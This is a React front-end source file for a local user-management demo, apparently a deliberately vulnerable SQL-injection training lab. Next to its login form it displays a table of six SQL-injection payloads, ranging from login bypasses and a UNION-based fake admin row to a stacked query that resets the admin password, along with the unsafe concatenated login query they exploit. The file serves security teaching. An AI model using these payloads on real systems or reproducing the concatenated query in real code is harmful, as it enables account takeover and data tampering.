import axios from "axios";
import React, { useState, useEffect } from "react";

const App = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [user, setUser] = useState(null);
  const [message, setMessage] = useState("");
  const [users, setUsers] = useState([]);
  const [newUser, setNewUser] = useState({
    username: "",
    password: "",
    role: "",
  });
  const [editUser, setEditUser] = useState(null);

  const API_URL = "http://localhost:3000";

  useEffect(() => {
    if (user) {
      fetchUsers();
    }
  }, [user]);

  const fetchUsers = async () => {
    try {
      const response = await axios.get(`${API_URL}/users`);
      setUsers(response.data);
    } catch (error) {
      setMessage("Error fetching users");
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(`${API_URL}/login`, {
        username,
        password,
      });
      setUser(response.data.user);
      setMessage(`Welcome ${response.data.user.username}!`);
    } catch (error) {
      setMessage("Login failed");
    }
  };

  const handleLogout = () => {
    setUser(null);
    setMessage("");
  };

  const handleCreateUser = async (e) => {
    e.preventDefault();
    try {
      await axios.post(`${API_URL}/users`, newUser);
      setNewUser({ username: "", password: "", role: "" });
      fetchUsers();
      setMessage("User created successfully");
    } catch (error) {
      setMessage("Error creating user");
    }
  };

  const handleUpdateUser = async (e) => {
    e.preventDefault();
    try {
      await axios.put(`${API_URL}/users/${editUser.id}`, editUser);
      setEditUser(null);
      fetchUsers();
      setMessage("User updated successfully");
    } catch (error) {
      setMessage("Error updating user");
    }
  };

  const handleDeleteUser = async (id) => {
    try {
      await axios.delete(`${API_URL}/users/${id}`);
      fetchUsers();
      setMessage("User deleted successfully");
    } catch (error) {
      setMessage("Error deleting user");
    }
  };

  const sqlInjections = [
    {
      payload: "admin' # ",
      description: "Login as admin user by commenting out password check",
    },
    {
      payload: "' OR '1'='1' # ",
      description:
        "Login as first user in database by making WHERE clause always true",
    },
    {
      payload: "' OR 1=1 LIMIT 1 # ",
      description: "Login as first user by making condition true with limit",
    },
    {
      payload: "' UNION SELECT 1,2,'admin','admin' # ",
      description: "Create fake admin result in query response",
    },
    {
      payload: "' OR username LIKE '%admin%' # ",
      description: "Login as any user with 'admin' in their username",
    },
    {
      payload:
        "admin'; UPDATE users SET password='hacked' WHERE username='admin' # ",
      description:
        "Attempt to change admin password (only works if multi-query allowed)",
    },
  ];

  return (
    <div
      style={{
        width: "100%",
        maxWidth: "75rem",
        margin: "0 auto",
        padding: "20px",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        minHeight: "100vh",
      }}
    >
      {!user ? (
        <div
          style={{
            width: "100%",
            display: "flex",
            flexDirection: "row",
            flexWrap: "wrap",
            gap: "20px",
          }}
        >
          <div
            style={{
              flex: "1 1 300px",
              textAlign: "center",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
            }}
          >
            <h2>Login</h2>
            <form
              onSubmit={handleLogin}
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "10px",
                maxWidth: "300px",
                margin: "0 auto",
              }}
            >
              <input
                type="text"
                placeholder="Username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={{ padding: "8px" }}
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{ padding: "8px" }}
              />
              <button
                type="submit"
                style={{
                  padding: "8px",
                  backgroundColor: "#4CAF50",
                  color: "white",
                  border: "none",
                  cursor: "pointer",
                }}
              >
                Login
              </button>
              {!user && message === "Login failed" && (
                <p
                  style={{
                    color: "#f44336",
                    marginTop: "10px",
                    marginBottom: "0",
                  }}
                >
                  {message}
                </p>
              )}
            </form>
          </div>

          <div
            style={{
              flex: "1 1 300px",
              padding: "15px",
              border: "1px solid #ddd",
              borderRadius: "5px",
            }}
          >
            <h3>SQL Injection Examples</h3>
            <div style={{ maxHeight: "300px", overflowY: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse" }}>
                <thead>
                  <tr>
                    <th
                      style={{
                        border: "1px solid #ddd",
                        padding: "8px",
                        textAlign: "left",
                        backgroundColor: "#f2f2f2",
                      }}
                    >
                      Payload
                    </th>
                    <th
                      style={{
                        border: "1px solid #ddd",
                        padding: "8px",
                        textAlign: "left",
                        backgroundColor: "#f2f2f2",
                      }}
                    >
                      Description
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {sqlInjections.map((injection, index) => (
                    <tr key={index}>
                      <td
                        style={{
                          border: "1px solid #ddd",
                          padding: "8px",
                          fontFamily: "monospace",
                        }}
                      >
                        {injection.payload}
                      </td>
                      <td style={{ border: "1px solid #ddd", padding: "8px" }}>
                        {injection.description}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            <div
              style={{
                marginTop: "15px",
                padding: "10px",
                backgroundColor: "#f8f9fa",
                borderRadius: "5px",
                border: "1px solid #e9ecef",
              }}
            >
              <p
                style={{
                  fontSize: "14px",
                  color: "#6c757d",
                  marginBottom: "5px",
                }}
              >
                <strong>Note:</strong> These SQL injections target the login
                endpoint:
              </p>
              <code
                style={{
                  display: "block",
                  whiteSpace: "pre-wrap",
                  fontSize: "12px",
                  backgroundColor: "#f1f1f1",
                  padding: "8px",
                  borderRadius: "4px",
                }}
              >
                {`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`}
              </code>
            </div>
          </div>
        </div>
      ) : (
        <div style={{ width: "100%" }}>
          <div
            style={{
              display: "flex",
              flexDirection: "row",
              gap: "20px",
              flexWrap: "wrap",
            }}
          >
            <div
              style={{
                flex: "1 1 300px",
                padding: "15px",
                border: "1px solid #ddd",
                borderRadius: "5px",
                marginBottom: "20px",
              }}
            >
              <h2>Hello World!</h2>
              <p>
                Logged in as: <strong>{user.username}</strong>
              </p>
              <p>
                Role: <strong>{user.role}</strong>
              </p>
              <button
                onClick={handleLogout}
                style={{
                  padding: "8px",
                  backgroundColor: "#f44336",
                  color: "white",
                  border: "none",
                  cursor: "pointer",
                }}
              >
                Logout
              </button>
            </div>

            <div
              style={{
                flex: "1 1 300px",
                padding: "15px",
                border: "1px solid #ddd",
                borderRadius: "5px",
                marginBottom: "20px",
              }}
            >
              <h3>Create New User</h3>
              <form
                onSubmit={handleCreateUser}
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "10px",
                }}
              >
                <input
                  type="text"
                  placeholder="Username"
                  value={newUser.username}
                  onChange={(e) =>
                    setNewUser({ ...newUser, username: e.target.value })
                  }
                  style={{ padding: "8px" }}
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={newUser.password}
                  onChange={(e) =>
                    setNewUser({ ...newUser, password: e.target.value })
                  }
                  style={{ padding: "8px" }}
                />
                <input
                  type="text"
                  placeholder="Role"
                  value={newUser.role}
                  onChange={(e) =>
                    setNewUser({ ...newUser, role: e.target.value })
                  }
                  style={{ padding: "8px" }}
                />
                <button
                  type="submit"
                  style={{
                    padding: "8px",
                    backgroundColor: "#4CAF50",
                    color: "white",
                    border: "none",
                    cursor: "pointer",
                  }}
                >
                  Create
                </button>
              </form>
            </div>

            {editUser && (
              <div
                style={{
                  flex: "1 1 300px",
                  padding: "15px",
                  border: "1px solid #ddd",
                  borderRadius: "5px",
                  marginBottom: "20px",
                }}
              >
                <h3>Edit User</h3>
                <form
                  onSubmit={handleUpdateUser}
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "10px",
                  }}
                >
                  <input
                    type="text"
                    placeholder="Username"
                    value={editUser.username}
                    onChange={(e) =>
                      setEditUser({ ...editUser, username: e.target.value })
                    }
                    style={{ padding: "8px" }}
                  />
                  <input
                    type="password"
                    placeholder="Password"
                    value={editUser.password || ""}
                    onChange={(e) =>
                      setEditUser({ ...editUser, password: e.target.value })
                    }
                    style={{ padding: "8px" }}
                  />
                  <input
                    type="text"
                    placeholder="Role"
                    value={editUser.role}
                    onChange={(e) =>
                      setEditUser({ ...editUser, role: e.target.value })
                    }
                    style={{ padding: "8px" }}
                  />
                  <div style={{ display: "flex", gap: "10px" }}>
                    <button
                      type="submit"
                      style={{
                        flex: 1,
                        padding: "8px",
                        backgroundColor: "#2196F3",
                        color: "white",
                        border: "none",
                        cursor: "pointer",
                      }}
                    >
                      Update
                    </button>
                    <button
                      type="button"
                      onClick={() => setEditUser(null)}
                      style={{
                        flex: 1,
                        padding: "8px",
                        backgroundColor: "#f44336",
                        color: "white",
                        border: "none",
                        cursor: "pointer",
                      }}
                    >
                      Cancel
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>

          <div
            style={{
              padding: "15px",
              border: "1px solid #ddd",
              borderRadius: "5px",
              width: "100%",
            }}
          >
            <h3>Users List</h3>
            <table style={{ width: "100%", borderCollapse: "collapse" }}>
              <thead>
                <tr>
                  <th
                    style={{
                      border: "1px solid #ddd",
                      padding: "8px",
                      textAlign: "left",
                    }}
                  >
                    ID
                  </th>
                  <th
                    style={{
                      border: "1px solid #ddd",
                      padding: "8px",
                      textAlign: "left",
                    }}
                  >
                    Username
                  </th>
                  <th
                    style={{
                      border: "1px solid #ddd",
                      padding: "8px",
                      textAlign: "left",
                    }}
                  >
                    Role
                  </th>
                  <th
                    style={{
                      border: "1px solid #ddd",
                      padding: "8px",
                      textAlign: "left",
                    }}
                  >
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user.id}>
                    <td style={{ border: "1px solid #ddd", padding: "8px" }}>
                      {user.id}
                    </td>
                    <td style={{ border: "1px solid #ddd", padding: "8px" }}>
                      {user.username}
                    </td>
                    <td style={{ border: "1px solid #ddd", padding: "8px" }}>
                      {user.role}
                    </td>
                    <td style={{ border: "1px solid #ddd", padding: "8px" }}>
                      <button
                        onClick={() => setEditUser({ ...user, password: "" })}
                        style={{
                          marginRight: "5px",
                          padding: "5px 10px",
                          backgroundColor: "#2196F3",
                          color: "white",
                          border: "none",
                          cursor: "pointer",
                        }}
                      >
                        Edit
                      </button>
                      <button
                        onClick={() => handleDeleteUser(user.id)}
                        style={{
                          padding: "5px 10px",
                          backgroundColor: "#f44336",
                          color: "white",
                          border: "none",
                          cursor: "pointer",
                        }}
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
      {user && message && (
        <p style={{ marginTop: "20px", color: "#4CAF50" }}>{message}</p>
      )}
    </div>
  );
};

export default App;
